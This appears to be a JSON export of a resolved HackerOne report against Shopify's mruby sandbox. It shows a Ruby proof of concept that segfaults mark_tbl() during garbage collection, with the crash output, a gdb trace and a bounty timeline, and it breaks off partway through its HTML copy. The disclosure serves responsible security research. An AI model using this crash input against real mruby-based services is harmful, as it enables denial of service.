{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-12-17T02:29:27.925Z", 
    "voters": [
        "eveeez", 
        "mpz", 
        "spetr0x", 
        "janhacker", 
        "hackerjuan"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "8000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 183239, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-12-16T19:57:51.012Z", 
    "vulnerability_information": "There is an invalid memory access on mruby when calling to `mark_tbl()` which causes a SIGSEGV and leads to denial of service.\n\n## Sample\n\nThe following code triggers the bug (attached as mark_tbl.min2.rb):\n```ruby\nt0me=%\nArray.new(9){t0me.empty?s=Array.new(9){%{}*0\ns=Array.dup.new(23)\nArray(0)}\nArray(0..6)}\n```\n\n## Crash\n\nHere we can see the crash (full crash output attached)\n\n```\n$ bin/sandbox /tmp/mark_tbl.min2.rb\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000017\nruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0201 s:0005 E:0011d8 EVAL   bin/sandbox:21 [FINISH]\nc:0001 p:0000 s:0002 E:001470 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\nbin/sandbox:21:in `<main>'\nbin/sandbox:21:in `sandbox_eval'\n\n-- Machine register context ------------------------------------------------\n RIP: 0x00007f95a747dea7 RBP: 0x0000000000000311 RSP: 0x00007f95a5fd4e10\n RAX: 0x0000000000000008 RBX: 0x00007f95a5fd74e0 RCX: 0x00007f95a746b4ef\n RDX: 0x00007f95a74d3234 RDI: 0x00007f95a5fd74e0 RSI: 0x00007f95a60274e0\n  R8: 0x0000000000000008  R9: 0x0000000000000001 R10: 0x0000000000000000\n R11: 0x0000000000000000 R12: 0x0000000000000017 R13: 0x0000000000000001\n R14: 0x00007f95a60274e0 R15: 0x0000000000000002 EFL: 0x0000000000010206\n\n-- C level backtrace information -------------------------------------------\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f95ab76fea5]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f95ab7700dc]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f95ab64a364]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f95ab6fbdbe]\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f95ab3ceed0]\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_gc_mark_iv+0x17) [0x7f95a747dea7] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:402\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(incremental_gc.part.10+0x1da) [0x7f95a746b4fa] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:604\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_incremental_gc+0x1f3) [0x7f95a746bed3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1062\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_obj_alloc+0xfd) [0x7f95a746c58d] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:486\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_instance_new+0x53) [0x7f95a74548f3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1298\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x762) [0x7f95a746ecf2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f95a7474567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_run+0x17) [0x7f95a746cbf7] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2442\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_funcall_with_block+0x2fc) [0x7f95a746cefc] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:414\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_instance_new+0xb0) [0x7f95a7454950] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1323\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x762) [0x7f95a746ecf2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f95a7474567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_run+0x17) [0x7f95a746cbf7] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2442\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_funcall_with_block+0x2fc) [0x7f95a746cefc] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:414\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_instance_new+0xb0) [0x7f95a7454950] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1323\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x762) [0x7f95a746ecf2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f95a7474567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f95a7448173] ../../../../ext/mruby_engine/eval_monitored.c:68\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f95ab3c5464]\n/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7f95aa74130d]\n```\n\n## Crash debug\n```\n(gdb) r\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /usr/bin/ruby /home/jaime/research/shopy/mruby-engine/bin/sandbox /tmp/mark_tbl.min2.rb\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n[New Thread 0x7ffff7ff5700 (LWP 5190)]\n[New Thread 0x7ffff2348700 (LWP 5242)]\n\nProgram received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2348700 (LWP 5242)]\nmark_tbl (t=0x17, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:403\n403         iv_foreach(mrb, t, iv_mark_i, 0);\n(gdb) x/1i $rip\n=> 0x7ffff37efea7 <mrb_gc_mark_iv+23>:  mov    r8d,DWORD PTR [r12]\n(gdb) i r r12\nr12            0x17     23\n(gdb) list *$rip\n0x7ffff37efea7 is in mrb_gc_mark_iv (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:354).\n349       khash_t(iv) *h = &t->h;\n350       khiter_t k;\n351       int n;\n352\n353       if (h) {\n354         for (k = kh_begin(h); k != kh_end(h); k++) {\n355           if (kh_exist(h, k)) {\n356             n = (*func)(mrb, kh_key(h, k), kh_value(h, k), p);\n357             if (n > 0) return FALSE;\n358             if (n < 0) {\n```\n\nBacktrace\n```\n(gdb) bt\n#0  mark_tbl (t=0x17, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:403\n#1  mrb_gc_mark_iv (mrb=mrb@entry=0x7ffff23494e0, obj=obj@entry=0x7ffff23994e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:423\n#2  0x00007ffff37dd4fa in gc_mark_children (gc=0x7ffff23495b8, obj=<optimized out>, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:604\n#3  gc_gray_mark (obj=<optimized out>, gc=0x7ffff23495b8, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:834\n#4  incremental_marking_phase (limit=<optimized out>, gc=<optimized out>, mrb=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:929\n#5  incremental_gc (mrb=mrb@entry=0x7ffff23494e0, gc=gc@entry=0x7ffff23495b8, limit=limit@entry=2000) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1028\n#6  0x00007ffff37dded3 in incremental_gc (limit=<optimized out>, gc=<optimized out>, mrb=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1062\n#7  incremental_gc_step (gc=0x7ffff23495b8, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1063\n#8  mrb_incremental_gc (mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1107\n#9  0x00007ffff37de58d in mrb_obj_alloc (mrb=mrb@entry=0x7ffff23494e0, ttype=ttype@entry=MRB_TT_OBJECT, cls=cls@entry=0x7ffff2399420) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:486\n#10 0x00007ffff37c68f3 in mrb_instance_alloc (cv=..., mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1298\n#11 mrb_instance_new (mrb=0x7ffff23494e0, cv=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1322\n#12 0x00007ffff37e0cf2 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=<optimized out>, proc@entry=0x7ffff234fed0, pc=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n#13 0x00007ffff37e6567 in mrb_vm_run (mrb=mrb@entry=0x7ffff23494e0, proc=proc@entry=0x7ffff234fed0, self=..., stack_keep=3) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#14 0x00007ffff37debf7 in mrb_run (mrb=mrb@entry=0x7ffff23494e0, proc=proc@entry=0x7ffff234fed0, self=..., self@entry=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2442\n#15 0x00007ffff37deefc in mrb_funcall_with_block (mrb=mrb@entry=0x7ffff23494e0, self=..., self@entry=..., mid=<optimized out>, argc=<optimized out>, argc@entry=1, argv=argv@entry=0x7ffff235bb70, blk=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:414\n#16 0x00007ffff37c6950 in mrb_instance_new (mrb=0x7ffff23494e0, cv=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1323\n#17 0x00007ffff37e0cf2 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=<optimized out>, proc@entry=0x7ffff234fed0, pc=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n#18 0x00007ffff37e6567 in mrb_vm_run (mrb=mrb@entry=0x7ffff23494e0, proc=proc@entry=0x7ffff234fed0, self=..., stack_keep=3) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#19 0x00007ffff37debf7 in mrb_run (mrb=mrb@entry=0x7ffff23494e0, proc=proc@entry=0x7ffff234fed0, self=..., self@entry=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2442\n#20 0x00007ffff37deefc in mrb_funcall_with_block (mrb=mrb@entry=0x7ffff23494e0, self=..., self@entry=..., mid=<optimized out>, argc=<optimized out>, argc@entry=1, argv=argv@entry=0x7ffff235bb18, blk=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:414\n#21 0x00007ffff37c6950 in mrb_instance_new (mrb=0x7ffff23494e0, cv=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1323\n#22 0x00007ffff37e0cf2 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=<optimized out>, proc@entry=0x7ffff2351520, pc=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n#23 0x00007ffff37e6567 in mrb_vm_run (mrb=0x7ffff23494e0, proc=0x7ffff2351520, self=..., stack_keep=stack_keep@entry=0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#24 0x00007ffff37ba173 in mruby_engine_monitored_eval (data=0x7ffff23493e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n#25 0x00007ffff7737464 in start_thread (arg=0x7ffff2348700) at pthread_create.c:333\n#26 0x00007ffff6ab330d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109\n```\n\n\n## Impact\n\nIts impact seems to be limited to DoS of the service running the ruby sandbox. The invalid address can be controlled by the user but in a really limited way, so I doubut this chould be turned into a write-what-where type vuln.", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "high", 
        "author_type": "Team"
    }, 
    "title": "SIGSEGV on mruby's mark_tbl() (Invalid memory access)", 
    "is_member_of_team?": null, 
    "vote_count": 5, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-01-15T19:57:51.051Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$8,000", 
    "attachments": [
        {
            "file_name": "mark_tbl.min2.rb", 
            "type": "text/plain", 
            "id": 135312, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/135/312/505ab8eaa73be7931d1af4a625e08e2be14df249/mark_tbl.min2.rb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224543Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4132c4d5967ed4d52cd9e2ba6484883c7cd960d30f5697ed3625e388f0c414ee"
        }, 
        {
            "file_name": "mark_tbl.crash.log", 
            "type": "text/plain", 
            "id": 135313, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/135/313/f91b68fc05b82ff81f2543dafbbd16982f19129a/mark_tbl.crash.log?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224543Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cd51e5a75fc159737eff73664f690a008e897261acfbff7e6542b9f5be311dc5"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-11-18T14:15:36.605Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-18T14:15:36.605Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "Thank you for your report. We've reproduced the issue, and our engineering team is investigating.", 
            "markdown_message": "<p>Thank you for your report. We&#39;ve reproduced the issue, and our engineering team is investigating.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1306762, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-11-18T14:15:55.395Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-18T14:15:55.395Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "High", 
                "old_severity": null
            }, 
            "team_handle": "shopify-scripts", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 1306763, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "jpenalbae", 
                "url": "/jpenalbae"
            }, 
            "created_at": "2016-11-22T21:18:42.825Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-22T21:18:42.825Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "Hi @jpenalbae,\n\nThanks again for the report. We recently deployed a fix to our production environment.\n\nI'm marking this issue as resolved now but we still need to fix this bug upstream before we can assess the impact & determine a final bounty amount. This may take a few weeks since we received a large number of valid issues and we want to calibrate our payouts across all of them.", 
            "markdown_message": "<p>Hi <a href=\"/jpenalbae\">@jpenalbae</a>,</p>\n\n<p>Thanks again for the report. We recently deployed a fix to our production environment.</p>\n\n<p>I&#39;m marking this issue as resolved now but we still need to fix this bug upstream before we can assess the impact &amp; determine a final bounty amount. This may take a few weeks since we received a large number of valid issues and we want to calibrate our payouts across all of them.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1313795, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-11-25T16:06:15.200Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-25T16:06:15.200Z", 
            "actor": {
                "username": "francoischagnon", 
                "url": "/francoischagnon", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/168/3b5130025fbf90eaeb1c9234baa340dfead68f44_medium.jpg?1429126005"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "We've opened a PR that fixes this issue with mruby upstream: https://github.com/mruby/mruby/pull/3278/files", 
            "markdown_message": "<p>We&#39;ve opened a PR that fixes this issue with mruby upstream: <a title=\"https://github.com/mruby/mruby/pull/3278/files\" href=\"/redirect?signature=b6c8610666ede4c12f5a1b4ba8849d21f4242db8&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fpull%2F3278%2Ffiles\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/pull/3278/files</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 1319255, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-12-16T19:57:44.462Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-12-16T19:57:44.462Z", 
            "actor": {
                "url": "/shopify-scripts", 
                "profile": {
                    "name": "shopify-scripts"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
                }
            }, 
            "team_handle": "shopify-scripts", 
            "bounty_amount": "8000.0", 
            "collaborator": {
                "username": "jpenalbae", 
                "url": "/jpenalbae"
            }, 
            "message": "Thanks for helping improve the security of Shopify Scripts and the mruby project!", 
            "markdown_message": "<p>Thanks for helping improve the security of Shopify Scripts and the mruby project!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1370059, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-12-16T19:57:51.033Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-12-16T19:57:51.033Z", 
            "actor": {
                "username": "andrewdunbar", 
                "url": "/andrewdunbar", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/164/cd46f5270ea41c5f0da3bea93e2eca7a95858caf_medium.jpg?1427927985"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1370060, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-12-17T02:29:27.955Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-12-17T02:29:27.955Z", 
            "actor": {
                "username": "jpenalbae", 
                "url": "/jpenalbae", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1370761, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-12-17T02:29:28.037Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-12-17T02:29:28.037Z", 
            "actor": {
                "username": "jpenalbae", 
                "url": "/jpenalbae", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1370762, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "jpenalbae", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/jpenalbae", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 2, 
        "name": "Memory Corruption - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -59626072.68268297, 
    "disclosed_at": "2016-12-17T02:29:27.988Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/183239", 
    "created_at": "2016-11-18T05:04:03.540Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>There is an invalid memory access on mruby when calling to <code>mark_tbl()</code> which causes a SIGSEGV and leads to denial of service.</p>\n\n<h2 id=\"sample\">Sample</h2>\n\n<p>The following code triggers the bug (attached as mark_tbl.min2.rb):</p>\n<pre class=\"highlight ruby\"><code><span class=\"n\">t0me</span><span class=\"o\">=%</span>\n<span class=\"no\">Array</span><span class=\"p\">.</span><span class=\"nf\">new</span><span class=\"p\">(</span><span class=\"mi\">9</span><span class=\"p\">){</span><span class=\"n\">t0me</span><span class=\"p\">.</span><span class=\"nf\">empty?</span><span class=\"n\">s</span><span class=\"o\">=</span><span class=\"no\">Array</span><span class=\"p\">.</span><span class=\"nf\">new</span><span class=\"p\">(</span><span class=\"mi\">9</span><span class=\"p\">){</span><span class=\"sx\">%{}</span><span class=\"o\">*</span><span class=\"mi\">0</span>\n<span class=\"n\">s</span><span class=\"o\">=</span><span class=\"no\">Array</span><span class=\"p\">.</span><span class=\"nf\">dup</span><span class=\"p\">.</span><span class=\"nf\">new</span><span class=\"p\">(</span><span class=\"mi\">23</span><span class=\"p\">)</span>\n<span class=\"no\">Array</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">)}</span>\n<span class=\"no\">Array</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">.</span><span class=\"nf\">.</span><span class=\"mi\">6</span><span class=\"p\">)}</span>\n</code></pre>\n<h2 id=\"crash\">Crash</h2>\n\n<p>Here we can see the crash (full crash output attached)</p>\n<pre class=\"highlight plaintext\"><code>$ bin/sandbox /tmp/mark_tbl.min2.rb\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000017\nruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0201 s:0005 E:0011d8 EVAL   bin/sandbox:21 [FINISH]\nc:0001 p:0000 s:0002 E:001470 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\nbin/sandbox:21:in `&lt;main&gt;&#39;\nbin/sandbox:21:in `sandbox_eval&#39;\n\n-- Machine register context ------------------------------------------------\n RIP: 0x00007f95a747dea7 RBP: 0x0000000000000311 RSP: 0x00007f95a5fd4e10\n RAX: 0x0000000000000008 RBX: 0x00007f95a5fd74e0 RCX: 0x00007f95a746b4ef\n RDX: 0x00007f95a74d3234 RDI: 0x00007f95a5fd74e0 RSI: 0x00007f95a60274e0\n  R8: 0x0000000000000008  R9: 0x0000000000000001 R10: 0x0000000000000000\n R11: 0x0000000000000000 R12: 0x0000000000000017 R13: 